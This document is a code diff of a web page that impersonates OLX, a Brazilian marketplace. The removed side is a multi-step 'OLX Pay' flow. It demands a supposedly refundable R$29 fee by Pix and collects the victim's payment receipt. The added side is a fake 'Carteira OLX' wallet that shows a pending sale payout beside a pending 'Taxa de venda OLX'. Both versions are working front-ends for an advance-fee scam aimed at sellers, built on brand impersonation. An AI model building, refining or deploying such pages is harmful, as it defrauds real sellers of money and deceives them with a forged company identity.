@@ -1,621 +1,455 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OLX Pay - Central de Vendas</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carteira OLX</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:opsz,wght@6..12,400;6..12,600;6..12,700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Nunito Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
 
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-}
+        body {
+            background-color: #e5e5e5;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
 
-body {
-    background: #eef2f6;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    color: #1a202c;
-}
+        .mobile-screen {
+            width: 100%;
+            max-width: 412px;
+            background-color: #f4f4f6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            position: relative;
+        }
 
-/* CONTAINER MOBILE OTIMIZADO */
-.container {
-    width: 100%;
-    max-width: 420px;
-    background: #fff;
-    min-height: 100vh;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-    display: flex;
-    flex-direction: column;
-}
+        /* Header e Área Roxo Principal */
+        .header-top {
+            background-color: #6e0ad6;
+            color: #ffffff;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+        }
 
-@media (min-width: 421px) {
-    .container {
-        height: 850px;
-        min-height: auto;
-        border-radius: 24px;
-        overflow: hidden;
-        border: 1px solid #e2e8f0;
-    }
-}
+        .header-top h1 {
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
 
-/* HEADER */
-header {
-    padding: 16px 20px;
-    border-bottom: 1px solid #edf2f7;
-    background: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-}
+        .balance-section {
+            background-color: #6e0ad6;
+            color: #ffffff;
+            padding: 18px 20px 28px 20px;
+            position: relative;
+        }
 
-.logo {
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-}
-.logo span:nth-child(1){ color: #6e0ad6; }
-.logo span:nth-child(2){ color: #00a650; }
-.logo span:nth-child(3){ color: #ff6a00; }
+        .menu-dots {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 14px;
+        }
 
-.step-indicator {
-    font-size: 12px;
-    font-weight: 600;
-    color: #718096;
-    background: #f1f5f9;
-    padding: 4px 10px;
-    border-radius: 20px;
-}
+        .balance-label {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            display: block;
+        }
 
-/* CONTEÚDO */
-.content {
-    padding: 24px 20px;
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-}
+        .balance-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-/* CARD / MODAL INTERNO */
-.card {
-    background: #fff;
-    border: 1px solid #e2e8f0;
-    border-radius: 12px; /* Deixado mais quadradinho/moderno conforme pedido */
-    padding: 24px 20px;
-    text-align: center;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.02);
-}
+        .balance-value {
+            display: flex;
+            align-items: baseline;
+            line-height: 1;
+        }
 
-/* ÍCONE DE DESTAQUE NO TOPO DO CARD */
-.card-icon {
-    width: 48px;
-    height: 48px;
-    background: #f3e8ff;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 16px auto;
-    color: #6e0ad6;
-}
+        .balance-value .currency {
+            font-size: 22px;
+            font-weight: 700;
+            margin-right: 6px;
+            align-self: center;
+        }
 
-.subtitle {
-    font-size: 17px;
-    font-weight: 700;
-    color: #1a202c;
-    margin-bottom: 12px;
-}
+        .balance-value .main-amount {
+            font-size: 52px;
+            font-weight: 400;
+            letter-spacing: -1px;
+        }
 
-/* ALERTA */
-.alert {
-    background: #f8fafc;
-    border: 1px solid #e2e8f0;
-    color: #475569;
-    border-radius: 10px;
-    padding: 14px;
-    font-size: 13px;
-    line-height: 1.5;
-    text-align: left;
-    margin-bottom: 20px;
-}
+        .balance-value .cents {
+            font-size: 24px;
+            font-weight: 400;
+        }
 
-.alert strong {
-    color: #1a202c;
-}
+        .btn-withdraw {
+            background-color: #ffffff;
+            color: #1a1a1a;
+            border: none;
+            border-radius: 24px;
+            padding: 11px 22px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
 
-/* PREÇO */
-.price-box {
-    background: #f3e8ff;
-    border-radius: 10px;
-    padding: 12px;
-    margin-bottom: 20px;
-    color: #3b2a63;
-    font-size: 14px;
-}
+        /* Faixa Roxo Escuro (Transferindo / A receber) */
+        .sub-balance-bar {
+            background-color: #4f069c;
+            color: #ffffff;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
 
-.price-value {
-    font-size: 20px;
-    font-weight: 800;
-    color: #6e0ad6;
-}
+        .sub-balance-info {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            font-size: 15px;
+        }
 
-/* BOTÕES */
-.btn {
-    width: 100%;
-    padding: 13px;
-    border-radius: 10px;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s ease;
-    border: none;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-}
+        .sub-balance-info span strong {
+            font-weight: 700;
+        }
 
-.btn-primary {
-    background: #6e0ad6;
-    color: #fff;
-    box-shadow: 0 4px 12px rgba(110, 10, 214, 0.2);
-}
+        /* Conteúdo Principal */
+        .content {
+            padding: 16px 16px 24px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            flex: 1;
+        }
 
-.btn-primary:hover {
-    background: #5a08b4;
-}
+        /* Banner Informativo Azul Claro */
+        .info-banner {
+            background-color: #e4f5f8;
+            border-radius: 10px;
+            padding: 16px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            color: #0e4f5c;
+        }
 
-.btn-outline {
-    border: 1.5px solid #d8b4fe;
-    color: #6e0ad6;
-    background: #fff;
-    margin-top: 10px;
-}
+        .info-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
 
-.btn-outline:hover {
-    background: #faf5ff;
-}
+        .info-text h3 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #125c6b;
+        }
 
-/* QR CODE E PIX */
-.qr-container {
-    background: #f8fafc;
-    border: 1px dashed #cbd5e1;
-    border-radius: 10px;
-    padding: 14px;
-    display: inline-block;
-    margin-bottom: 14px;
-}
+        .info-text p {
+            font-size: 14.5px;
+            line-height: 1.45;
+            color: #125c6b;
+        }
 
-.qr {
-    width: 150px;
-    height: 150px;
-    display: block;
-    margin: 0 auto;
-    border-radius: 6px;
-}
+        .info-text strong {
+            font-weight: 700;
+        }
 
-.pix-group {
-    display: flex;
-    gap: 8px;
-    margin-bottom: 14px;
-}
+        /* Card Saque Automático */
+        .card {
+            background-color: #ffffff;
+            border-radius: 14px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        }
 
-.input {
-    width: 100%;
-    padding: 11px;
-    border-radius: 8px;
-    border: 1px solid #cbd5e1;
-    background: #f8fafc;
-    font-size: 12px;
-    font-family: monospace;
-    color: #475569;
-}
+        .auto-withdraw-card {
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+        }
 
-.btn-copy {
-    background: #f3e8ff;
-    color: #6e0ad6;
-    border: 1px solid #d8b4fe;
-    white-space: nowrap;
-    width: auto;
-    padding: 0 14px;
-    font-size: 13px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: 600;
-}
+        .illustration {
+            width: 56px;
+            flex-shrink: 0;
+        }
 
-.btn-copy:hover {
-    background: #e9d5ff;
-}
+        .auto-withdraw-content {
+            flex: 1;
+        }
 
-/* UPLOAD */
-.upload-area {
-    border: 2px dashed #cbd5e1;
-    border-radius: 10px;
-    padding: 20px;
-    text-align: center;
-    background: #f8fafc;
-    cursor: pointer;
-    margin-bottom: 16px;
-    transition: 0.2s;
-}
+        .auto-withdraw-content h2 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 8px;
+        }
 
-.upload-area:hover {
-    border-color: #6e0ad6;
-    background: #faf5ff;
-}
+        .auto-withdraw-content p {
+            font-size: 14px;
+            line-height: 1.4;
+            color: #555555;
+            margin-bottom: 16px;
+        }
 
-.upload-text {
-    font-size: 13px;
-    color: #475569;
-    font-weight: 500;
-    margin-top: 6px;
-}
+        .btn-accounts {
+            background-color: #6e0ad6;
+            color: #ffffff;
+            border: none;
+            border-radius: 24px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+        }
 
-/* STEP FINAL */
-.final-card {
-    background: #fff;
-    border: 1px solid #e2e8f0;
-    border-radius: 12px;
-    padding: 28px 18px;
-    text-align: center;
-}
+        /* Card Histórico */
+        .history-card {
+            background-color: #ffffff;
+            border-radius: 14px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            display: flex;
+            flex-direction: column;
+        }
 
-.final-title {
-    color: #1a202c;
-    font-size: 20px;
-    font-weight: 700;
-    margin-bottom: 10px;
-}
+        .history-card h2 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 8px;
+        }
 
-.final-img {
-    width: 100px;
-    margin-bottom: 16px;
-}
+        .history-list {
+            display: flex;
+            flex-direction: column;
+        }
 
-.final-box {
-    background: #f3e8ff;
-    color: #3b2a63;
-    border-radius: 10px;
-    padding: 14px;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 16px;
-}
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 0;
+            border-bottom: 1px solid #eeeeee;
+        }
 
-.divider {
-    width: 100%;
-    height: 1px;
-    background: #edf2f7;
-    margin: 20px 0;
-    position: relative;
-}
+        .history-item:last-child {
+            border-bottom: none;
+            padding-bottom: 2px;
+        }
 
-.attention-label {
-    position: absolute;
-    top: -10px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #fff;
-    padding: 0 10px;
-    color: #e11d48;
-    font-size: 11px;
-    font-weight: 700;
-    text-transform: uppercase;
-}
+        .history-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
 
-.attention-text, .terms-text {
-    font-size: 11px;
-    color: #718096;
-    line-height: 1.4;
-}
+        .history-title {
+            font-size: 14.5px;
+            font-weight: 600;
+            color: #222222;
+            line-height: 1.35;
+        }
 
-.terms-text span {
-    color: #6e0ad6;
-    font-weight: 600;
-}
+        .history-date {
+            font-size: 13px;
+            color: #767676;
+        }
 
-/* LOADING OVERLAY */
-.loading-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255, 255, 255, 0.9);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    z-index: 9999;
-    gap: 14px;
-}
+        .history-amount-positive {
+            font-size: 15px;
+            font-weight: 700;
+            color: #008a3e;
+            white-space: nowrap;
+        }
 
-.loading-overlay.active {
-    display: flex;
-    animation: fadeIn 0.2s ease-in;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-}
-
-.spinner {
-    width: 40px;
-    height: 40px;
-    border: 4px solid #edf2f7;
-    border-top: 4px solid #6e0ad6;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-.loading-text {
-    font-size: 13px;
-    color: #4a5568;
-    font-weight: 600;
-}
-
-.hidden { display: none !important; }
-</style>
+        .history-status-pending {
+            font-size: 12.5px;
+            font-weight: 700;
+            color: #666666;
+            background-color: #f0f0f2;
+            padding: 4px 10px;
+            border-radius: 12px;
+            white-space: nowrap;
+        }
+    </style>
 </head>
-
 <body>
 
-<!-- Loading Overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="loading-text" id="loadingText">Processando...</div>
-</div>
-
-<div class="container">
-    <header>
-        <div class="logo">
-            <span>o</span><span>l</span><span>x</span>
-        </div>
-        <div class="step-indicator" id="stepIndicator">Passo 1 de 5</div>
-    </header>
-
-    <div class="content">
-
-        <!-- PASSO 1 -->
-        <div id="step1" class="card">
-            <div class="card-icon">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-            </div>
-            <div class="subtitle">Aviso importante</div>
-            <div class="alert">
-                Identificamos uma venda recente e notamos que você ainda não possui pontuação consolidada como vendedor sob as novas diretrizes.<br><br>
-                Cobramos uma taxa antecipada reembolsável. <strong>O valor é devolvido integralmente</strong> junto com o total da venda.
-            </div>
-            
-            <div class="price-box">
-                Valor único: <span class="price-value">R$ <span id="valorTaxa">29,00</span></span>
+    <div class="mobile-screen">
+        <!-- Área Principal de Saldo -->
+        <section class="balance-section">
+            <div class="menu-dots">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <circle cx="12" cy="5" r="2"></circle>
+                    <circle cx="12" cy="12" r="2"></circle>
+                    <circle cx="12" cy="19" r="2"></circle>
+                </svg>
             </div>
 
-            <button class="btn btn-primary" onclick="goNext(1)">Continuar</button>
-        </div>
+            <span class="balance-label">Saldo disponível</span>
 
-        <!-- PASSO 2 -->
-        <div id="step2" class="card hidden">
-            <div class="card-icon">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            <div class="balance-row">
+                <div class="balance-value">
+                    <span class="currency">R$</span>
+                    <span class="main-amount">0</span>
+                    <span class="cents">,00</span>
+                </div>
+                <button class="btn-withdraw">Sacar agora</button>
             </div>
-            <div class="subtitle">Confirmação de segurança</div>
-            <div class="alert">
-                Esta etapa valida sua identidade e protege ambas as partes na negociação.<br><br>
-                Assim que concluído, o valor da taxa será somado automaticamente ao seu saldo a receber.
-            </div>
-            <button class="btn btn-primary" onclick="goNext(2)">Entendi, prosseguir</button>
-        </div>
+        </section>
 
-        <!-- PASSO 3 -->
-        <div id="step3" class="card hidden">
-            <div class="card-icon">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2" ry="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+        <!-- Barra Secundária -->
+        <section class="sub-balance-bar">
+            <div class="sub-balance-info">
+                <span>Transferindo <strong id="transferindo-val">R$ 0,00</strong></span>
+                <span>Total a receber <strong id="receber-val">R$ 0,00</strong></span>
             </div>
-            <div class="subtitle">Pagamento via OLX Pay</div>
-            <p style="font-size:13px; color:#64748b; margin-bottom:14px;">Escaneie o QR Code ou copie o código Pix:</p>
-            
-            <div class="qr-container">
-                <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=PIXTESTE" alt="QR Code Pix">
-            </div>
-            
-            <div class="pix-group">
-                <input class="input" value="000201PIXCODE..." readonly id="pixCode">
-                <button class="btn-copy" onclick="copy()">Copiar</button>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+        </section>
+
+        <!-- Corpo da Página -->
+        <main class="content">
+            <!-- Aviso Prazo para Saque -->
+            <div class="info-banner">
+                <div class="info-icon">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#188094" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                    </svg>
+                </div>
+                <div class="info-text">
+                    <h3>Prazo para saque</h3>
+                    <p>Por motivos de segurança, a previsão para o saldo ficar disponível em sua conta é de até <strong>2 dias úteis</strong> após a solicitação.</p>
+                </div>
             </div>
 
-            <button class="btn btn-primary" onclick="paid()">Já realizei o pagamento</button>
-        </div>
-
-        <!-- PASSO 4 -->
-        <div id="step4" class="card hidden">
-            <div class="card-icon">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
-            </div>
-            <div class="subtitle">Envie o comprovante</div>
-            <div class="alert" style="margin-bottom: 14px;">
-                Para agilizar a liberação e validação, envie o comprovante da transação abaixo.
-            </div>
-            
-            <div class="upload-area" id="uploadBtn">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6e0ad6" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
-                <div class="upload-text" id="uploadText">Clique para selecionar o arquivo</div>
-            </div>
-            <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png" style="display:none;">
-            
-            <button class="btn btn-primary" onclick="goFinal()">Confirmar envio</button>
-        </div>
-
-        <!-- PASSO 5 (FINAL) -->
-        <div id="step5" class="card hidden">
-            <div class="final-card" style="border:none; padding: 0;">
-                <h2 class="final-title">Tudo certo por aqui! 🎉</h2>
-                
-                <img class="final-img" src="https://i.ibb.co/kVKs7sbv/Gemini-Generated-Image-qsh1voqsh1voqsh1.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/4140/4140048.png'">
-
-                <div class="final-box">
-                    Comprovante em análise pela equipe de segurança.
+            <!-- Card Saque Automático -->
+            <div class="card auto-withdraw-card">
+                <!-- Ilustração Vetorial -->
+                <div class="illustration">
+                    <svg viewBox="0 0 64 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Celular -->
+                        <rect x="8" y="8" width="28" height="50" rx="4" fill="#FFFFFF" stroke="#222222" stroke-width="1.5"/>
+                        <line x1="18" y1="12" x2="26" y2="12" stroke="#222222" stroke-width="1.5" stroke-linecap="round"/>
+                        <!-- Símbolo $ -->
+                        <text x="19" y="30" fill="#222222" font-size="11" font-weight="bold" font-family="sans-serif">$</text>
+                        <!-- Detalhe Roxo no celular -->
+                        <rect x="17" y="36" width="12" height="3" rx="1.5" fill="#6E0AD6"/>
+                        <!-- Dedos segurando -->
+                        <rect x="4" y="25" width="7" height="5" rx="2.5" fill="#FFFFFF" stroke="#222222" stroke-width="1.3"/>
+                        <rect x="4" y="31" width="8" height="5" rx="2.5" fill="#FFFFFF" stroke="#222222" stroke-width="1.3"/>
+                        <rect x="4" y="37" width="8" height="5" rx="2.5" fill="#FFFFFF" stroke="#222222" stroke-width="1.3"/>
+                        <rect x="5" y="43" width="7" height="5" rx="2.5" fill="#FFFFFF" stroke="#222222" stroke-width="1.3"/>
+                        <!-- Mão base -->
+                        <path d="M10 48 C10 56, 16 64, 24 64 L32 64 L32 48" fill="#FFFFFF" stroke="#222222" stroke-width="1.3"/>
+                        <!-- Badge Roxo com Setas -->
+                        <rect x="31" y="14" width="22" height="22" rx="4" fill="#6E0AD6"/>
+                        <path d="M37 22H47M47 22L44 19M47 22L44 25" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M47 29H37M37 29L40 26M37 29L40 32" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
                 </div>
 
-                <div class="divider">
-                    <span class="attention-label">Importante</span>
+                <div class="auto-withdraw-content">
+                    <h2>Saque automático</h2>
+                    <p>Seu saldo e pagamentos liberados serão transferidos automaticamente para a sua conta principal.</p>
+                    <button class="btn-accounts">Ver minhas contas</button>
                 </div>
-
-                <p class="attention-text" style="margin-bottom: 14px;">
-                    Esta central de atendimento é exclusiva para vendas realizadas na modalidade de retirada em mãos.
-                </p>
-
-                <p class="terms-text">
-                    Ao utilizar nossos serviços, você concorda com os <span>Termos de Uso</span> e a <span>Política de Privacidade</span> da OLX.
-                </p>
             </div>
-        </div>
 
+            <!-- Card Histórico -->
+            <div class="history-card">
+                <h2>Histórico</h2>
+                <div class="history-list">
+                    <!-- Preenchido dinamicamente pelo JSON -->
+                </div>
+            </div>
+        </main>
     </div>
-</div>
 
-<script>
-let fileSelected = false;
-let fileObject = null;
+    <script>
+        async function carregarDadosCarteira() {
+            try {
+                const resposta = await fetch('dados.json');
+                const dadosJson = await resposta.json();
 
-function atualizarIndicador(passo) {
-    const indicador = document.getElementById('stepIndicator');
-    if (passo <= 5) {
-        indicador.textContent = `Passo ${passo} de 5`;
-    } else {
-        indicador.textContent = `Concluído`;
-    }
-}
+                // Como o JSON é um array com o produto, pegamos o primeiro item (índice 0)
+                const produto = dadosJson[0];
+                const valorProduto = produto.valor; // Ex: 2790
 
-function carregarValorTaxa() {
-    fetch('/config.json')
-        .then(res => res.json())
-        .then(data => {
-            const el = document.getElementById('valorTaxa');
-            if (el && data.preco) el.textContent = parseFloat(data.preco).toFixed(2).replace('.', ',');
-        })
-        .catch(err => console.log('Usando valor padrão.'));
-}
+                // 1. Saldo Disponível (mantém 0.00 ou ajusta se houver outra regra)
+                const saldoDisponivel = 0.00;
+                const saldoFormatado = saldoDisponivel.toLocaleString('pt-BR', {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+                const [inteiroFormatado, parteCentavos] = saldoFormatado.split(',');
+                document.querySelector('.main-amount').textContent = inteiroFormatado;
+                document.querySelector('.cents').textContent = ',' + parteCentavos;
 
-function carregarDadosVenda() {
-    const id = localStorage.getItem('vendaId');
-    if (!id) return;
-    
-    fetch(`/api/venda/${id}`)
-        .then(res => res.json())
-        .then(data => {
-            if (data) {
-                const valorTaxa = document.getElementById('valorTaxa');
-                if (valorTaxa && (data.valorTaxa != null || data.taxa != null)) {
-                    valorTaxa.textContent = parseFloat(data.valorTaxa ?? data.taxa).toFixed(2).replace('.', ',');
-                }
-                if (data.codigoPix) {
-                    document.querySelector('.qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(data.codigoPix)}`;
-                    document.getElementById('pixCode').value = data.codigoPix;
-                }
+                // 2. Atualiza o Total a receber puxando o valor do JSON
+                const valorFormatadoStr = 'R$ ' + valorProduto.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                document.getElementById('receber-val').textContent = valorFormatadoStr;
+
+                // 3. Preenche o Histórico dinamicamente com base no JSON
+                const historyList = document.querySelector('.history-list');
+                historyList.innerHTML = '';
+
+                // Item 1: Aguardando liberação (puxa o valor do JSON)
+                const itemLiberacao = document.createElement('div');
+                itemLiberacao.className = 'history-item';
+                itemLiberacao.innerHTML = `
+                    <div class="history-info">
+                        <span class="history-title">Aguardando liberação do pagamento da OLX</span>
+                        <span class="history-date">11/11/2026</span>
+                    </div>
+                    <span class="history-amount-positive">+${valorFormatadoStr}</span>
+                `;
+                historyList.appendChild(itemLiberacao);
+
+                // Item 2: Taxa de venda OLX (Pendente)
+                const itemTaxa = document.createElement('div');
+                itemTaxa.className = 'history-item';
+                itemTaxa.innerHTML = `
+                    <div class="history-info">
+                        <span class="history-title">Taxa de venda OLX</span>
+                        <span class="history-date">11/11/2026</span>
+                    </div>
+                    <span class="history-status-pending">Pendente</span>
+                `;
+                historyList.appendChild(itemTaxa);
+
+            } catch (erro) {
+                console.error('Erro ao carregar o JSON da carteira:', erro);
             }
-        })
-        .catch(err => console.error(err));
-}
+        }
 
-document.addEventListener('DOMContentLoaded', function() {
-    carregarValorTaxa();
-    carregarDadosVenda();
-    
-    const uploadArea = document.getElementById('uploadBtn');
-    const fileInput = document.getElementById('fileInput');
-    
-    if (uploadArea && fileInput) {
-        uploadArea.addEventListener('click', () => fileInput.click());
-        fileInput.addEventListener('change', (e) => {
-            if (e.target.files && e.target.files.length > 0) {
-                fileObject = e.target.files[0];
-                fileSelected = true;
-                document.getElementById('uploadText').textContent = '✓ ' + fileObject.name;
-                uploadArea.style.borderColor = '#00a650';
-                uploadArea.style.background = '#f0fdf4';
-            }
-        });
-    }
-});
-
-function showLoading(text){
-    document.getElementById("loadingText").innerText = text;
-    document.getElementById("loadingOverlay").classList.add("active");
-}
-
-function hideLoading(){
-    document.getElementById("loadingOverlay").classList.remove("active");
-}
-
-function goNext(step){
-    document.getElementById("step"+step).classList.add("hidden");
-    showLoading("Validando informações...");
-    setTimeout(()=>{
-        hideLoading();
-        const nextStep = step + 1;
-        document.getElementById("step"+nextStep).classList.remove("hidden");
-        atualizarIndicador(nextStep);
-    }, 1500);
-}
-
-function paid(){
-    document.getElementById("step3").classList.add("hidden");
-    showLoading("Confirmando transação...");
-    setTimeout(()=>{
-        hideLoading();
-        document.getElementById("step4").classList.remove("hidden");
-        atualizarIndicador(4);
-    }, 1800);
-}
-
-function copy(){
-    const input = document.getElementById("pixCode");
-    input.select();
-    navigator.clipboard.writeText(input.value);
-    alert("Código Pix copiado com sucesso!");
-}
-
-async function goFinal(){
-    if (!fileSelected) {
-        alert('Por favor, selecione o comprovante do pagamento antes de continuar.');
-        return;
-    }
-    
-    document.getElementById("step4").classList.add("hidden");
-    showLoading("Enviando comprovante...");
-    
-    try {
-        const formData = new FormData();
-        formData.append('comprovante', fileObject);
-        
-        const response = await fetch('/api/enviar-comprovante', { method: 'POST', body: formData });
-        const data = await response.json();
-        
-        hideLoading();
-        showLoading("Finalizando cadastro...");
-        setTimeout(()=>{
-            hideLoading();
-            document.getElementById("step5").classList.remove("hidden");
-            atualizarIndicador(5);
-        }, 1200);
-    } catch (error) {
-        hideLoading();
-        document.getElementById("step5").classList.remove("hidden");
-        atualizarIndicador(5);
-    }
-}
-</script>
-
+        carregarDadosCarteira();
+    </script>
 </body>
 </html>
